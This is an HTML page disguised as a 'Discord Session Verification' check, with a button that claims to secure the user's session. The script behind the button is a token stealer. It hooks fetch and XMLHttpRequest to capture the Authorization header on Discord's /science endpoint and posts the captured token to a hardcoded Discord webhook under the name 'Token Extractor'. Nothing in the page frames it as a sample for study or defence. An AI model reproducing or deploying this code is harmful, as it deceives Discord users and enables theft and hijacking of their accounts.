<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Session Verification</title>
    <!-- Favicon to prevent 404 error (1x1 transparent pixel) -->
    <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQYV2NgAAIAAAUAAarVyFEAAAAASUVORK5CYII=">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #36393f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background-color: #2f3136;
            padding: 32px;
            border-radius: 5px;
            max-width: 600px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 16px;
        }
        p {
            color: #b9bbbe;
            margin-bottom: 24px;
        }
        button {
            padding: 12px 24px;
            background-color: #5865f2;
            border: none;
            border-radius: 3px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #4752c4;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Discord Session Verification</h1>
        <p>Click below while on Discord to verify your account status. This ensures your session is secure.</p>
        <button onclick="runTokenExtractor()">Verify Session</button>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1375083886199181353/1dK2QCQMfKi6zYZ46tEWDuy_vCsm5wUy3_YLxOEGFjns__v77Gw7IsWrdcCmiwaBVLKb";

        // Centralized logging function
        function logMessage(level, context, message, extra = {}) {
            const timestamp = new Date().toISOString();
            let log = `[${timestamp}] [${level}] ${context}: ${message}`;
            if (extra.status) log += ` (Status: ${extra.status} ${extra.statusText || ''})`;
            if (extra.url) log += ` (URL: ${extra.url})`;
            if (extra.response) log += ` (Response: ${extra.response.slice(0, 100)})`;
            if (extra.details) log += ` (Details: ${extra.details})`;
            switch (level) {
                case 'ERROR':
                    console.error(log);
                    break;
                case 'SUCCESS':
                    console.log(`%c${log}`, 'color: green');
                    break;
                default:
                    console.log(log);
            }
        }

        function runTokenExtractor() {
            logMessage('INFO', 'runTokenExtractor', 'Starting token extraction');
            try {
                if (!window.location.href.includes("discord.com")) {
                    logMessage('INFO', 'runTokenExtractor', 'Not on discord.com, redirecting');
                    alert("Please run this on discord.com (e.g., https://discord.com/channels/@me)");
                    window.open("https://discord.com/channels/1322328218279088128/1327050794020900987", "_blank");
                    return;
                }

                // Inject token extraction script
                (function() {
                    let tokenFound = false;
                    logMessage('INFO', 'TokenExtractor', 'Initializing script');

                    function waitForPageLoad() {
                        return new Promise((resolve, reject) => {
                            try {
                                logMessage('INFO', 'waitForPageLoad', 'Checking page load state');
                                if (document.readyState === "complete") {
                                    logMessage('SUCCESS', 'waitForPageLoad', 'Page fully loaded');
                                    resolve();
                                } else {
                                    window.addEventListener("load", () => {
                                        logMessage('SUCCESS', 'waitForPageLoad', 'Page fully loaded via event');
                                        resolve();
                                    }, { once: true });
                                }
                            } catch (error) {
                                logMessage('ERROR', 'waitForPageLoad', error.message);
                                reject(error);
                            }
                        });
                    }

                    const originalOpen = XMLHttpRequest.prototype.open;
                    XMLHttpRequest.prototype.open = function(method, url) {
                        try {
                            logMessage('INFO', 'XMLHttpRequest', `Opening request to ${url}`);
                            this.addEventListener("readystatechange", function() {
                                try {
                                    if (this.readyState === 4) {
                                        if (url.includes("discord.com/api/v9/science")) {
                                            if (this.status !== 200) {
                                                logMessage('ERROR', 'XMLHttpRequest', 'Science request failed', {
                                                    status: this.status,
                                                    statusText: this.statusText,
                                                    url,
                                                    response: this.responseText
                                                });
                                            } else {
                                                logMessage('SUCCESS', 'XMLHttpRequest', 'Science request successful', { url });
                                            }
                                            const token = this.getRequestHeader("Authorization");
                                            if (token && (token.includes(".") || token.startsWith("mfa."))) {
                                                logMessage('SUCCESS', 'XMLHttpRequest', 'Token captured', { token: token.substring(0, 10) });
                                                sendToWebhook(token, "Science Endpoint");
                                                tokenFound = true;
                                            }
                                        }
                                    }
                                } catch (error) {
                                    logMessage('ERROR', 'XMLHttpRequest handler', error.message, { url });
                                }
                            }, false);
                            originalOpen.apply(this, arguments);
                        } catch (error) {
                            logMessage('ERROR', 'XMLHttpRequest open', error.message, { url });
                        }
                    };

                    const originalFetch = window.fetch;
                    window.fetch = async function(url, options = {}) {
                        try {
                            logMessage('INFO', 'Fetch', `Fetching ${url}`);
                            if (url.includes("discord.com/api/v9/science")) {
                                const token = options.headers?.Authorization || options.headers?.authorization;
                                if (token && (token.includes(".") || token.startsWith("mfa."))) {
                                    logMessage('SUCCESS', 'Fetch', 'Token captured', { token: token.substring(0, 10) });
                                    sendToWebhook(token, "Science Endpoint");
                                    tokenFound = true;
                                }
                            }
                            const response = await originalFetch.apply(this, arguments);
                            if (url.includes("discord.com/api/v9/science")) {
                                if (!response.ok) {
                                    const responseText = await response.text();
                                    logMessage('ERROR', 'Fetch', 'Science request failed', {
                                        status: response.status,
                                        statusText: response.statusText,
                                        url,
                                        response: responseText
                                    });
                                } else {
                                    logMessage('SUCCESS', 'Fetch', 'Science request successful', { url });
                                }
                            }
                            return response;
                        } catch (error) {
                            logMessage('ERROR', 'Fetch', error.message, { url });
                            throw error;
                        }
                    };

                    async function sendToWebhook(token, source) {
                        const payload = {
                            content: "",
                            embeds: [{
                                title: "Token Captured",
                                description: `**Token**: ${token.substring(0, 10)}...\n**Source**: ${source}\n**Captured At**: ${new Date().toISOString()}`,
                                color: 0x7289da
                            }],
                            username: "Token Extractor",
                            avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
                        };

                        try {
                            logMessage('INFO', 'sendToWebhook', 'Sending token to webhook', { token: token.substring(0, 10) });
                            const response = await fetch(WEBHOOK_URL, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify(payload)
                            });
                            if (response.ok) {
                                logMessage('SUCCESS', 'sendToWebhook', 'Webhook sent successfully', { url: WEBHOOK_URL });
                            } else {
                                const responseText = await response.text();
                                logMessage('ERROR', 'sendToWebhook', 'Webhook request failed', {
                                    status: response.status,
                                    statusText: response.statusText,
                                    url: WEBHOOK_URL,
                                    response: responseText
                                });
                            }
                        } catch (error) {
                            logMessage('ERROR', 'sendToWebhook', error.message, { url: WEBHOOK_URL });
                        }
                    }

                    async function triggerScienceRequest() {
                        try {
                            logMessage('INFO', 'triggerScienceRequest', 'Attempting to trigger /science request');
                            if (!window.location.href.includes("discord.com")) {
                                logMessage('INFO', 'triggerScienceRequest', 'Not on discord.com, redirecting');
                                window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
                                return;
                            }
                            const payload = {
                                event_name: "app_opened",
                                properties: { client_uuid: crypto.randomUUID() }
                            };
                            logMessage('INFO', 'triggerScienceRequest', 'Sending POST to /science', { details: JSON.stringify(payload) });
                            const response = await fetch("https://discord.com/api/v9/science", {
                                method: "POST",
                                headers: {
                                    "Authorization": localStorage.getItem("token") || "",
                                    "Content-Type": "application/json"
                                },
                                body: JSON.stringify(payload)
                            });
                            if (!response.ok) {
                                const responseText = await response.text();
                                logMessage('ERROR', 'triggerScienceRequest', 'Science request failed', {
                                    status: response.status,
                                    statusText: response.statusText,
                                    url: "https://discord.com/api/v9/science",
                                    response: responseText
                                });
                            } else {
                                logMessage('SUCCESS', 'triggerScienceRequest', 'Science request sent successfully');
                            }
                            logMessage('INFO', 'triggerScienceRequest', 'Navigating to channels page');
                            window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
                        } catch (error) {
                            logMessage('ERROR', 'triggerScienceRequest', error.message, { url: "https://discord.com/api/v9/science" });
                        }
                    }

                    async function monitorNetwork() {
                        if (tokenFound) {
                            logMessage('INFO', 'monitorNetwork', 'Token found, stopping loop');
                            return;
                        }
                        try {
                            logMessage('INFO', 'monitorNetwork', 'Starting network monitoring cycle');
                            await waitForPageLoad();
                            await triggerScienceRequest();
                            logMessage('INFO', 'monitorNetwork', 'Scheduling next cycle in 10 seconds');
                            setTimeout(monitorNetwork, 10000);
                        } catch (error) {
                            logMessage('ERROR', 'monitorNetwork', error.message);
                            setTimeout(monitorNetwork, 10000); // Continue loop despite errors
                        }
                    }

                    try {
                        logMessage('INFO', 'TokenExtractor', 'Checking initial page location');
                        if (!window.location.href.includes("discord.com")) {
                            logMessage('INFO', 'TokenExtractor', 'Not on discord.com, redirecting');
                            window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
                        } else {
                            logMessage('SUCCESS', 'TokenExtractor', 'Script started on discord.com');
                            monitorNetwork();
                        }
                    } catch (error) {
                        logMessage('ERROR', 'TokenExtractor', error.message);
                    }
                })();
                logMessage('SUCCESS', 'runTokenExtractor', 'Token extraction script injected');
                alert("Session verification initiated. You may close this page.");
            } catch (error) {
                logMessage('ERROR', 'runTokenExtractor', error.message);
            }
        }

        // Log favicon errors if any
        window.addEventListener('error', (event) => {
            if (event.target && event.target.tagName === 'LINK' && event.target.rel === 'icon') {
                logMessage('ERROR', 'Favicon', 'Failed to load favicon', { url: event.target.href });
            }
        }, true);
    </script>
</body>
</html>
